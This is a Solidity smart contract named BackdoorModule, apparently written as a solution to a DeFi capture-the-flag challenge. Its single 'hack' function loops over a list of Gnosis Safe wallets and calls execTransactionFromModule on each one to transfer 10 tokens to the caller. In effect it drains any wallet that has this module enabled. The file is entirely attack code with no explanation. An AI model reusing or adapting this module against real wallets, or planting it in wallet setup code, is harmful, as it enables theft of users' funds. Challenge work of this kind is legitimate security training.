// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/common/Enum.sol";

contract BackdoorModule {
    function hack(address token, address payable[] memory wallets) external {
        for (uint256 i = 0; i < wallets.length; i++) {
            GnosisSafe(wallets[i]).execTransactionFromModule(
                address(token),
                0,
                abi.encodeWithSignature(
                    "transfer(address,uint256)",
                    msg.sender,
                    10 ether
                ),
                Enum.Operation.Call
            );
        }
    }
}
